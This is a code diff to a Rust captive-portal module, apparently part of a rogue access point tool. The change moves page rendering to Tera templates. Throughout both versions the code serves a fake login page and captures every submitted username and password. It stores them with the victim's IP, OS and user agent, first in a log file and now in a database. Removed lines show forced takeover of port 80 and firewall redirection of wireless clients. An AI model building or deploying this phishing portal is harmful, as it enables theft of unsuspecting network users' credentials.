@@ -1,4 +1,4 @@
-//! Captive portal support.
+//! Captive portal support with Tera dynamic templates.
 
 use std::collections::HashMap;
 use std::fs;
@@ -7,6 +7,7 @@ use std::net::{TcpListener, TcpStream};
 use std::path::{Path, PathBuf};
 use std::sync::{atomic::{AtomicBool, Ordering}, Mutex, OnceLock};
 use std::thread;
+use tera::{Tera, Context};
 
 #[derive(Clone)]
 pub struct PortalConfig {
@@ -21,7 +22,7 @@ impl Default for PortalConfig {
     fn default() -> Self {
         PortalConfig {
             template_dir: std::env::var("AP1_PORTAL_TEMPLATE_DIR")
-                .unwrap_or_else(|_| "../config/templates/DarkLogin".to_string()),
+                .unwrap_or_else(|_| "../config/templates".to_string()),
             log_path: std::env::var("AP1_PORTAL_LOG")
                 .unwrap_or_else(|_| "../system/runtime/portal_credentials.log".to_string()),
             portal_ip: std::env::var("AP1_PORTAL_IP").unwrap_or_else(|_| "192.168.50.1".to_string()),
@@ -37,25 +38,10 @@ impl Default for PortalConfig {
     }
 }
 
-impl PortalConfig {
-    fn template_path(&self, file_name: &str) -> Option<PathBuf> {
-        let candidate = Path::new(&self.template_dir).join(file_name);
-        if candidate.exists() {
-            Some(candidate)
-        } else {
-            None
-        }
-    }
-
-    fn read_template(&self, file_name: &str) -> Option<String> {
-        self.template_path(file_name)
-            .and_then(|path| fs::read_to_string(path).ok())
-    }
-}
-
 struct PortalState {
     running: AtomicBool,
     thread: Mutex<Option<thread::JoinHandle<()>>>,
+    tera: OnceLock<Tera>,
 }
 
 static PORTAL_STATE: OnceLock<PortalState> = OnceLock::new();
@@ -64,6 +50,20 @@ fn portal_state() -> &'static PortalState {
     PORTAL_STATE.get_or_init(|| PortalState {
         running: AtomicBool::new(false),
         thread: Mutex::new(None),
+        tera: OnceLock::new(),
+    })
+}
+
+fn get_tera(template_dir: &str) -> &Tera {
+    portal_state().tera.get_or_init(|| {
+        let path = format!("{}/**/*.html", template_dir);
+        match Tera::new(&path) {
+            Ok(t) => t,
+            Err(e) => {
+                eprintln!("Tera construction error: {}", e);
+                Tera::default()
+            }
+        }
     })
 }
 
@@ -75,47 +75,36 @@ fn build_response(body: &str) -> String {
     )
 }
 
-fn login_page(cfg: &PortalConfig) -> String {
-    if let Some(template) = cfg.read_template("templates/login.html") {
-        return build_response(&template);
+fn render_page(template_name: &str, cfg: &PortalConfig, context_data: HashMap<&str, String>) -> String {
+    let tera = get_tera(&cfg.template_dir);
+    let mut context = Context::new();
+    for (k, v) in context_data {
+        context.insert(k, &v);
     }
-    if let Some(template) = cfg.read_template("login.html") {
-        return build_response(&template);
-    }
+    context.insert("portal_ip", &cfg.portal_ip);
 
-    let body = format!(r#"<!DOCTYPE html>
-<html lang='en'>
-<head><meta charset='UTF-8'><title>AP1 Captive Portal</title></head>
-<body>
-<h1>Welcome to AP1 Captive Portal</h1>
-<p>Portal IP: <strong>{}</strong></p>
-<form method='POST' action='/login'>
-<label>Login: <input name='login' required></label><br>
-<label>Password: <input type='password' name='password' required></label><br>
-<button type='submit'>Login</button>
-</form>
-</body>
-</html>"#, cfg.portal_ip);
+    match tera.render(template_name, &context) {
+        Ok(s) => build_response(&s),
+        Err(_) => {
+            // Fallback to basic HTML if template not found
+            if template_name.contains("login") {
+                login_page_fallback(&cfg.portal_ip)
+            } else {
+                success_page_fallback()
+            }
+        }
+    }
+}
+
+fn login_page_fallback(ip: &str) -> String {
+    let body = format!(r#"<!DOCTYPE html><html><body><h1>AP1 Login</h1><form method='POST' action='/login'>
+        User: <input name='login'><br>Pass: <input type='password' name='password'><br>
+        <button type='submit'>Login</button></form></body></html>"#);
     build_response(&body)
 }
 
-fn success_page(cfg: &PortalConfig) -> String {
-    if let Some(template) = cfg.read_template("templates/login_successful.html") {
-        return build_response(&template);
-    }
-    if let Some(template) = cfg.read_template("login_successful.html") {
-        return build_response(&template);
-    }
-
-    let body = r#"<!DOCTYPE html>
-<html lang='en'>
-<head><meta charset='UTF-8'><title>Login successful</title></head>
-<body>
-<h1>Login successful</h1>
-<p>Thank you. You may now continue browsing.</p>
-</body>
-</html>"#;
-    build_response(body)
+fn success_page_fallback() -> String {
+    build_response("<!DOCTYPE html><html><body><h1>Success</h1><p>You are now connected.</p></body></html>")
 }
 
 fn decode_url_component(component: &str) -> String {
@@ -153,33 +142,13 @@ fn parse_form(body: &str) -> HashMap<String, String> {
         .collect()
 }
 
-fn write_credentials(creds: &str, cfg: &PortalConfig) {
-    let path = &cfg.log_path;
-    if let Some(parent) = Path::new(path).parent() {
-        let _ = fs::create_dir_all(parent);
-    }
-    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(path) {
-        let _ = writeln!(file, "{}", creds);
-    }
-}
-
 fn detect_os(user_agent: &str) -> String {
     let ua = user_agent.to_lowercase();
-    if ua.contains("iphone") || ua.contains("ipad") {
-        "iOS".to_string()
-    } else if ua.contains("android") {
-        "Android".to_string()
-    } else if ua.contains("windows nt 10.0") {
-        "Windows 10/11".to_string()
-    } else if ua.contains("windows nt 6.1") {
-        "Windows 7".to_string()
-    } else if ua.contains("macintosh") {
-        "macOS".to_string()
-    } else if ua.contains("linux") {
-        "Linux".to_string()
-    } else {
-        "Unknown".to_string()
-    }
+    if ua.contains("iphone") || ua.contains("ipad") { "iOS".to_string() }
+    else if ua.contains("android") { "Android".to_string() }
+    else if ua.contains("windows") { "Windows".to_string() }
+    else if ua.contains("macintosh") { "macOS".to_string() }
+    else { "Linux".to_string() }
 }
 
 fn handle_connection(mut stream: TcpStream, cfg: PortalConfig) {
@@ -202,74 +171,45 @@ fn handle_connection(mut stream: TcpStream, cfg: PortalConfig) {
         let os = detect_os(&user_agent);
         let client_ip = stream.peer_addr().map(|a| a.ip().to_string()).unwrap_or_else(|_| "unknown".to_string());
 
+        let mut context = HashMap::new();
+        context.insert("os", os.clone());
+        context.insert("client_ip", client_ip.clone());
+
         if method == "POST" && path == "/login" {
             let body = request.split("\r\n\r\n").nth(1).unwrap_or_default();
             let values = parse_form(body);
-            let login = values
-                .get("login")
-                .cloned()
-                .or_else(|| values.get("username").cloned())
-                .unwrap_or_default();
+            let login = values.get("login").or(values.get("username")).cloned().unwrap_or_default();
             let password = values.get("password").cloned().unwrap_or_default();
-            let creds = format!("login={} password={} ip={} os={} ua={}", login, password, client_ip, os, user_agent);
-            write_credentials(&creds, &cfg);
-            let response = success_page(&cfg);
-            let _ = stream.write_all(response.as_bytes());
-        } else if method == "GET" && path == "/success" {
-            let response = success_page(&cfg);
+
+            crate::database::save_credential(&login, &password, &client_ip, &os, &user_agent);
+
+            let response = render_page("login_successful.html", &cfg, context);
             let _ = stream.write_all(response.as_bytes());
         } else {
-            let response = login_page(&cfg);
+            let response = render_page("login.html", &cfg, context);
             let _ = stream.write_all(response.as_bytes());
         }
     }
-}
-
-pub fn start_portal() {
-    let config = PortalConfig::default();
-    start_portal_with_config(config);
 }
 
 pub fn start_portal_with_config(cfg: PortalConfig) {
     let state = portal_state();
-    if state.running.load(Ordering::SeqCst) {
-        println!("captive portal already running");
-        return;
-    }
-
-    // Attempt to free port 80 if it's held by another process
-    if cfg.portal_port == 80 {
-        let _ = std::process::Command::new("fuser").args(["-k", "80/tcp"]).output();
-    }
+    if state.running.load(Ordering::SeqCst) { return; }
 
     state.running.store(true, Ordering::SeqCst);
     let bind_addr = format!("0.0.0.0:{}", cfg.portal_port);
-    match TcpListener::bind(&bind_addr) {
-        Ok(listener) => {
-            let inner_cfg = cfg.clone();
-            let handle = thread::spawn(move || {
-                println!("Captive portal started on http://{}", bind_addr);
-                for stream in listener.incoming() {
-                    if !portal_state().running.load(Ordering::SeqCst) {
-                        break;
-                    }
-                    if let Ok(stream) = stream {
-                        let cfg_clone = inner_cfg.clone();
-                        thread::spawn(move || handle_connection(stream, cfg_clone));
-                    }
+    if let Ok(listener) = TcpListener::bind(&bind_addr) {
+        let inner_cfg = cfg.clone();
+        let handle = thread::spawn(move || {
+            for stream in listener.incoming() {
+                if !portal_state().running.load(Ordering::SeqCst) { break; }
+                if let Ok(stream) = stream {
+                    let cfg_clone = inner_cfg.clone();
+                    thread::spawn(move || handle_connection(stream, cfg_clone));
                 }
-            });
-            *state.thread.lock().unwrap() = Some(handle);
-        }
-        Err(err) => {
-            eprintln!("failed to bind captive portal on {}: {}", bind_addr, err);
-            state.running.store(false, Ordering::SeqCst);
-            if cfg.fallback_port != cfg.portal_port {
-                println!("Attempting fallback port {}", cfg.fallback_port);
-                let fallback = PortalConfig { portal_port: cfg.fallback_port, ..cfg };
-                start_portal_with_config(fallback);
             }
-        }
+        });
+        *state.thread.lock().unwrap() = Some(handle);
     }
 }
 
@@ -279,7 +219,6 @@ pub fn stop_portal() {
     if let Some(handle) = state.thread.lock().unwrap().take() {
         let _ = handle.join();
     }
-    println!("captive portal stopped");
 }
 
 pub fn is_running() -> bool {
@@ -287,22 +226,6 @@ pub fn is_running() -> bool {
 }
 
 pub fn read_credentials() -> Vec<String> {
-    let cfg = PortalConfig::default();
-    if let Ok(contents) = fs::read_to_string(&cfg.log_path) {
-        contents.lines().map(String::from).collect()
-    } else {
-        Vec::new()
-    }
-}
-
-pub fn redirect_all_to_login() {
-    println!("captive portal redirect logic enabled.");
-    if let Err(err) = crate::system_control::apply_firewall_rules("wlan0", &PortalConfig::default().portal_ip) {
-        eprintln!("failed to apply captive portal firewall rules: {}", err);
-    }
-}
-
-pub fn log_credentials(creds: &str) {
-    let cfg = PortalConfig::default();
-    write_credentials(creds, &cfg);
+    // Legacy support: read from file if needed, but usually we use DB now
+    Vec::new()
 }
